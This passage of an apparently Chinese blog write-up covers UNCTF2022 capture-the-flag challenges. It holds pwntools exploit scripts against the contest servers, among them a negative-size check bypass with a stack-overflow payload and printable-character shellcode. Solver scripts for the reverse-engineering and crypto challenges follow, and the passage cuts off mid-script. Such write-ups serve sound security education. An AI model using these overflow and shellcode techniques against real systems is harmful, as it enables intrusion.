class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;node.yuzhian.com.cn&#x27;</span>,<span class="number">30253</span>)</span><br><span class="line">rand = [<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>]</span><br><span class="line">need = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">if</span> rand[i] == <span class="number">0</span>:</span><br><span class="line">        need.append(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">elif</span> rand[i] == <span class="number">1</span>:</span><br><span class="line">        need.append(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">elif</span> rand[i] == <span class="number">2</span>:</span><br><span class="line">        need.append(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;pwn later?(y/n)\n&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="built_in">print</span>(r.recvuntil(<span class="string">&#x27;]\x1B[0m\n&#x27;</span>))</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(need[i]))</span><br><span class="line">    <span class="built_in">print</span>(i,r.recvline())</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h3><p>测试符合条件的数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">int</span>    uint32;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _DWORD uint32</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LODWORD(x)  (*((_DWORD*)&amp;(x)))</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">size_t</span> nbytes;</span><br><span class="line"><span class="type">char</span> nptr[<span class="number">32</span>]=<span class="string">&quot; -33&quot;</span>;</span><br><span class="line">LODWORD(nbytes) = atoi(nptr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,atoi(nptr));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%x\n&quot;</span>,nptr[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">if</span> ( atoi(nptr) &gt; <span class="number">32</span> || nptr[<span class="number">0</span>] == <span class="number">0x2D</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No!!Hacker&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;%u&quot;</span>,(<span class="type">unsigned</span> <span class="type">int</span>)nbytes);</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>交互：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;node.yuzhian.com.cn&#x27;</span>,<span class="number">39482</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;name: \n&#x27;</span>)</span><br><span class="line">r.send(<span class="string">&#x27;xx&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;size: \n&#x27;</span>)</span><br><span class="line">r.send(<span class="string">&#x27; -33&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pl = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x50</span>+<span class="number">8</span>)+p64(<span class="number">0x4008c3</span>)</span><br><span class="line">r.send(pl)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="int-0x80"><a href="#int-0x80" class="headerlink" title="int 0x80"></a>int 0x80</h3><blockquote><p>easy easy easy Pwn</p></blockquote><p>ret2shellcode，其中的 <code>__ctype_b_loc</code> 函数的作用可参考 <code>ctype/ctype.h</code> 源码，将输入的字符根据 </p><p><code>((bit) &lt; 8 ? ((1 &lt;&lt; (bit)) &lt;&lt; 8) : ((1 &lt;&lt; (bit)) &gt;&gt; 8))</code></p><p>进行处理，然后根据下面表对应的内容返回。参考 <a href="https://blog.csdn.net/yongbaoii/article/details/120446765">2021 天翼杯 pwn ezshell</a>。</p><p><img src="/2022/11/18/match-UNCTF2022-%E5%85%AC%E5%BC%80%E8%B5%9B/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAeW9uZ2Jhb2lp,size_20,color_FFFFFF,t_70,g_se,x_16.png" alt="在这里插入图片描述" style="zoom:80%;"></p><p><code>s[i] &amp; 0x4000 != 0</code> 意思即要求的输入字符是可见字符。</p><p>参考 <a href="https://blog.csdn.net/mcmuyanga/article/details/114828207">mrctf2020_shellcode_revenge</a>，使用全可见字符shellcode输入即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;node.yuzhian.com.cn&#x27;</span>,<span class="number">32261</span>)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.send(<span class="string">&#x27;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># UNCTF&#123;h3ll0_w_0_r_1_d&#125;</span></span><br></pre></td></tr></table></figure><p>​    </p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="# Reverse"></a># Reverse</h2><h3 id="whereisyourkey"><a href="#whereisyourkey" class="headerlink" title="whereisyourkey"></a>whereisyourkey</h3><blockquote><p>你能找到属于你的key吗？</p></blockquote><p>简单替换加密。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">s = [<span class="number">121</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">105</span>, <span class="number">97</span>, <span class="number">107</span>, <span class="number">102</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">103</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">    <span class="keyword">if</span> s[i] == <span class="number">109</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">elif</span> s[i] &lt;= <span class="number">110</span>:</span><br><span class="line">    s[i] -= <span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> s[i] &gt; <span class="number">111</span>:</span><br><span class="line">    s[i] += <span class="number">3</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(s))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;yesiamflag&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="ezzzzre"><a href="#ezzzzre" class="headerlink" title="ezzzzre"></a>ezzzzre</h3><blockquote><p>re签到题</p></blockquote><p>exeinfo发现UPX壳，脱壳后，IDA中分析逻辑，顺着实现得flag：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="built_in">list</span>(<span class="string">b&#x27;HELLOCTF&#x27;</span>)</span><br><span class="line">out = [<span class="number">2</span>*k-<span class="number">69</span> <span class="keyword">for</span> k <span class="keyword">in</span> s]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(out))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;KESSYAcG&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="Sudoku"><a href="#Sudoku" class="headerlink" title="Sudoku"></a>Sudoku</h3><p>数独判定逻辑。直接运行显示的数独是错的，动调获取正确的数独初始数组，找个在线网站解了后填入为：</p><p><code>[8, 5, 2, 4, 9, 1, 6, 7, 3, 1, 9, 6, 7, 3, 8, 2, 5, 4, 4, 3, 7, 5, 6, 2, 9, 1, 8, 5, 2, 8, 1, 4, 6, 3, 9, 7, 3, 7, 4, 9, 2, 5, 8, 6, 1, 9, 6, 1, 3, 8, 7, 4, 2, 5, 2, 1, 9, 8, 5, 4, 7, 3, 6, 7, 4, 3, 6, 1, 9, 5, 8, 2, 6, 8, 5, 2, 7, 3, 1, 4, 9]</code></p><p>依次输入后得到</p><p> <code>Y0u_Ar3_R1ght!Th1s_1s_your_f1aaag!</code></p><p><code>UNCTF&#123;chr(29+vme)chr(15+vme)chr(29+vme)chr(24+vme)chr(39+vme)chr(25+vme)chr(29+vme)chr(20+vme)chr(32+vme)&#125;</code></p><p>其中 <code>vme=50</code>，即flag：<code>UNCTF&#123;OAOJYKOFR&#125;</code>。</p><p>​    </p><h3 id="halo"><a href="#halo" class="headerlink" title="halo"></a>halo</h3><p>exeinfo发现UPX壳，脱壳后，IDA中分析逻辑，为两轮异或，还原：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">s = [<span class="number">85</span>,  <span class="number">11</span>, <span class="number">104</span>,  <span class="number">12</span>, <span class="number">115</span>,  <span class="number">62</span>,  <span class="number">12</span>,  <span class="number">58</span>,  <span class="number">93</span>,  <span class="number">27</span>, </span><br><span class="line">   <span class="number">33</span>, <span class="number">117</span>,  <span class="number">79</span>,  <span class="number">32</span>,  <span class="number">76</span>, <span class="number">113</span>,  <span class="number">88</span>, <span class="number">123</span>,  <span class="number">89</span>,  <span class="number">44</span>, </span><br><span class="line">    <span class="number">0</span>, <span class="number">119</span>,  <span class="number">88</span>, <span class="number">119</span>,  <span class="number">14</span>, <span class="number">114</span>,  <span class="number">91</span>,  <span class="number">38</span>,  <span class="number">11</span>, <span class="number">112</span>, </span><br><span class="line">   <span class="number">10</span>, <span class="number">119</span>, <span class="number">102</span>, <span class="number">119</span>,  <span class="number">54</span>, <span class="number">118</span>,  <span class="number">55</span>, <span class="number">118</span>,  <span class="number">98</span>, <span class="number">114</span>, </span><br><span class="line">  <span class="number">109</span>,  <span class="number">39</span>,  <span class="number">63</span>, <span class="number">119</span>,  <span class="number">38</span>,  <span class="number">38</span>]</span><br><span class="line"></span><br><span class="line">s = [s[i]^<span class="number">0x33</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s))]</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)-<span class="number">1</span>,<span class="number">0</span>,-<span class="number">1</span>):</span><br><span class="line">    s[i] ^= s[i-<span class="number">1</span>]^i</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(s))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;f_ag&#123;H41oO0_6bb2920f8b98ae3f1fdb10cced277c2c&#125;-&#x27;</span></span><br><span class="line"><span class="comment"># 修正：flag&#123;H41oO0_6bb2920f8b98ae3f1fdb10cced277c2c&#125;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="HelloRust"><a href="#HelloRust" class="headerlink" title="HelloRust"></a>HelloRust</h3><blockquote><p>快来逆逆这一坨答辩罢</p></blockquote><p>IDA打开，分析代码逻辑，识别为RC4算法，找到密文hex值 <code>876927216FC731261B6C3A749A626EA002811D85E0E2D071F4A3090E</code>，以及key值 <code>UnCtF2022</code>，</p><p>使用Cyberchef得到flag明文：<code>unctf&#123;Ru5t_Rc4_1s_2_e@zy!!!&#125;</code>。</p><p>​    </p><h3 id="ezast"><a href="#ezast" class="headerlink" title="ezast"></a>ezast</h3><blockquote><p>你会ast吗</p></blockquote><p>JavaScript抽象语法树（AST），定位密文 <code>OTYN\\\\a[inE+iEl.hcEo)ivo+g</code>，且中间运算包含异或操作，尝试使用Cyberchef异或爆破，发现在key=0x1a时，得到flag：<code>UNCTF&#123;Ast_1s_v4ry_u3slu1&#125;</code>。</p><p>​    </p><h3 id="HUAQIANG"><a href="#HUAQIANG" class="headerlink" title="HUAQIANG"></a>HUAQIANG</h3><p>深育杯原题 生瓜蛋子，参考<a href="https://mp.weixin.qq.com/s/1V5BEsfdZNRKwWP1mCs8wQ">官方wp</a>，代码逻辑为一个VM，逐位爆破flag每位的可行值，得到满足条件的输入：<code>998bc64bbd919f27f44e5e2750644c</code>。</p><p>​    </p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="# Crypto"></a># Crypto</h2><h3 id="md5-1"><a href="#md5-1" class="headerlink" title="md5-1"></a>md5-1</h3><p>爆破可见字符得到md5表，再依次遍历密文取出相应字符。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line">c = <span class="string">&#x27;&#x27;&#x27;4c614360da93c0a041b22e537de151eb</span></span><br><span class="line"><span class="string">8d9c307cb7f3c4a32822a51922d1ceaa</span></span><br><span class="line"><span class="string">0d61f8370cad1d412f80b84d143e1257</span></span><br><span class="line"><span class="string">b9ece18c950afbfa6b0fdbfa4ff731d3</span></span><br><span class="line"><span class="string">800618943025315f869e4e1f09471012</span></span><br><span class="line"><span class="string">f95b70fdc3088560732a5ac135644506</span></span><br><span class="line"><span class="string">e1671797c52e15f763380b45e841ec32</span></span><br><span class="line"><span class="string">c9f0f895fb98ab9159f51fd0297e236d</span></span><br><span class="line"><span class="string">a87ff679a2f3e71d9181a67b7542122c</span></span><br><span class="line"><span class="string">8fa14cdd754f91cc6554c9e71929cce7</span></span><br><span class="line"><span class="string">e1671797c52e15f763380b45e841ec32</span></span><br><span class="line"><span class="string">8277e0910d750195b448797616e091ad</span></span><br><span class="line"><span class="string">cfcd208495d565ef66e7dff9f98764da</span></span><br><span class="line"><span class="string">c81e728d9d4c2f636f067f89cc14862c</span></span><br><span class="line"><span class="string">c9f0f895fb98ab9159f51fd0297e236d</span></span><br><span class="line"><span class="string">92eb5ffee6ae2fec3ad71c777531578f</span></span><br><span class="line"><span class="string">45c48cce2e2d7fbdea1afc51c7c6ad26</span></span><br><span class="line"><span class="string">cfcd208495d565ef66e7dff9f98764da</span></span><br><span class="line"><span class="string">a87ff679a2f3e71d9181a67b7542122c</span></span><br><span class="line"><span class="string">1679091c5a880faf6fb5e6087eb1b2dc</span></span><br><span class="line"><span class="string">8fa14cdd754f91cc6554c9e71929cce7</span></span><br><span class="line"><span class="string">4a8a08f09d37b73795649038408b5f33</span></span><br><span class="line"><span class="string">cfcd208495d565ef66e7dff9f98764da</span></span><br><span class="line"><span class="string">e1671797c52e15f763380b45e841ec32</span></span><br><span class="line"><span class="string">c9f0f895fb98ab9159f51fd0297e236d</span></span><br><span class="line"><span class="string">8fa14cdd754f91cc6554c9e71929cce7</span></span><br><span class="line"><span class="string">cfcd208495d565ef66e7dff9f98764da</span></span><br><span class="line"><span class="string">c9f0f895fb98ab9159f51fd0297e236d</span></span><br><span class="line"><span class="string">cfcd208495d565ef66e7dff9f98764da</span></span><br><span class="line"><span class="string">e1671797c52e15f763380b45e841ec32</span></span><br><span class="line"><span class="string">45c48cce2e2d7fbdea1afc51c7c6ad26</span></span><br><span class="line"><span class="string">1679091c5a880faf6fb5e6087eb1b2dc</span></span><br><span class="line"><span class="string">e1671797c52e15f763380b45e841ec32</span></span><br><span class="line"><span class="string">8f14e45fceea167a5a36dedd4bea2543</span></span><br><span class="line"><span class="string">c81e728d9d4c2f636f067f89cc14862c</span></span><br><span class="line"><span class="string">c4ca4238a0b923820dcc509a6f75849b</span></span><br><span class="line"><span class="string">c9f0f895fb98ab9159f51fd0297e236d</span></span><br><span class="line"><span class="string">a87ff679a2f3e71d9181a67b7542122c</span></span><br><span class="line"><span class="string">cbb184dd8e05c9709e5dcaedaa0495cf&#x27;&#x27;&#x27;</span>.split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">s = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>))</span><br><span class="line">t = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> s:</span><br><span class="line">    t[md5(<span class="built_in">chr</span>(k).encode()).hexdigest()] = <span class="built_in">chr</span>(k)</span><br><span class="line"></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> c:</span><br><span class="line">    flag += t[k]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># UNCTF&#123;e84fed028b9046fc0e8f080e96e72184&#125;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="dddd"><a href="#dddd" class="headerlink" title="dddd"></a>dddd</h3><p>1换为 <code>.</code>，0换为 <code>-</code>，摩斯密码解密得：<code>UNCTF&#123;Y4S_TH1S_JUST_M0RSE&#125;</code>。</p><p>​    </p><h3 id="caesar"><a href="#caesar" class="headerlink" title="caesar"></a>caesar</h3><p>ROT64变种凯撒密码，用脚本还原：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">s = <span class="string">&#x27;B6vAy&#123;dhd_AOiZ_KiMyLYLUa_JlL/HY_&#125;&#x27;</span></span><br><span class="line">dic = string.ascii_uppercase+string.ascii_lowercase+string.digits+<span class="string">&#x27;+/&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(dic)</span><br><span class="line"></span><br><span class="line">d = <span class="built_in">ord</span>(<span class="string">&#x27;U&#x27;</span>)-<span class="built_in">ord</span>(<span class="string">&#x27;B&#x27;</span>)</span><br><span class="line"></span><br><span class="line">t = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">  <span class="keyword">if</span> s[i] == <span class="string">&#x27;&#123;&#x27;</span> <span class="keyword">or</span> s[i] == <span class="string">&#x27;&#125;&#x27;</span> <span class="keyword">or</span> s[i] == <span class="string">&#x27;_&#x27;</span>:</span><br><span class="line">    t += s[i]</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    t += dic[(dic.index(s[i])+d)%<span class="number">64</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(t)</span><br><span class="line"></span><br><span class="line"><span class="comment"># UNCTF&#123;w0w_Th1s_d1fFerent_c4eSar_&#125;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="md5-2"><a href="#md5-2" class="headerlink" title="md5-2"></a>md5-2</h3><p>比md5-1多了一层异或操作，还原即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line">c = <span class="string">&#x27;&#x27;&#x27;4c614360da93c0a041b22e537de151eb</span></span><br><span class="line"><span class="string">c1fd731c6d60040369908b4a5f309f41</span></span><br><span class="line"><span class="string">80fdc84bbb5ed9e207a21d5436efdcfd</span></span><br><span class="line"><span class="string">b48d19bb99a7e6bb448f63b75bc92384</span></span><br><span class="line"><span class="string">39eaf918a52fcaa5ed9195e546b021c1</span></span><br><span class="line"><span class="string">795d6869f32db43ff5b414de3c235514</span></span><br><span class="line"><span class="string">f59a054403f933c842e9c3235c136367</span></span><br><span class="line"><span class="string">c80b37816048952a3c0fc9780602a2fa</span></span><br><span class="line"><span class="string">810ecef68e945c3fe7d6accba8b329bd</span></span><br><span class="line"><span class="string">cad06891e0c769c7b02c228c8c2c8865</span></span><br><span class="line"><span class="string">470a96d253a639193530a15487fea36f</span></span><br><span class="line"><span class="string">470a96d253a639193530a15487fea36f</span></span><br><span class="line"><span class="string">4bdea6676e5335f857fa8e47249fa1d8</span></span><br><span class="line"><span class="string">810ecef68e945c3fe7d6accba8b329bd</span></span><br><span class="line"><span class="string">edbb7ab78cde98a07b9b5a2ab284bf0a</span></span><br><span class="line"><span class="string">44b43e07e9af05e3b9b129a287e5a8df</span></span><br><span class="line"><span class="string">a641c08ed66b55c9bd541fe1b22ce5c0</span></span><br><span class="line"><span class="string">abed1f675819a2c0f65c9b7da8cab301</span></span><br><span class="line"><span class="string">738c486923803a1b59ef17329d70bbbd</span></span><br><span class="line"><span class="string">7e209780adf2cd1212e793ae8796ed7c</span></span><br><span class="line"><span class="string">a641c08ed66b55c9bd541fe1b22ce5c0</span></span><br><span class="line"><span class="string">a641c08ed66b55c9bd541fe1b22ce5c0</span></span><br><span class="line"><span class="string">636a84a33e1373324d64463eeb8e7614</span></span><br><span class="line"><span class="string">6ec65b4ab061843b066cc2a2f16820d5</span></span><br><span class="line"><span class="string">a4a39b59eb036a4a8922f7142f874114</span></span><br><span class="line"><span class="string">8c34745bd5b5d42cb3efe381eeb88e4b</span></span><br><span class="line"><span class="string">5b1ba76b1d36847d632203a75c4f74e2</span></span><br><span class="line"><span class="string">d861570e7b9998dbafb38c4f35ba08bc</span></span><br><span class="line"><span class="string">464b7d495dc6019fa4a709da29fc7952</span></span><br><span class="line"><span class="string">8eb69528cd84b73d858be0947f97b7cc</span></span><br><span class="line"><span class="string">dd6ac4c783a9059d11cb0910fc95d4a</span></span><br><span class="line"><span class="string">4b6b0ee5d5f6b24e6898997d765c487c</span></span><br><span class="line"><span class="string">b0762bc356c466d6b2b8f6396f2e041</span></span><br><span class="line"><span class="string">8547287408e2d2d8f3834fc1b90c3be9</span></span><br><span class="line"><span class="string">82947a7d007b9854fa62efb18c9fd91f</span></span><br><span class="line"><span class="string">8ddafe43b36150de851c83d80bd22b0a</span></span><br><span class="line"><span class="string">c7b36c5f23587e285e528527d1263c8b</span></span><br><span class="line"><span class="string">2a0816e8af86e68825c9df0d63a28381</span></span><br><span class="line"><span class="string">63ce72a42cf62e6d0fdc6c96df4687e3&#x27;&#x27;&#x27;</span>.split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cc = [<span class="built_in">int</span>(k,<span class="number">16</span>) <span 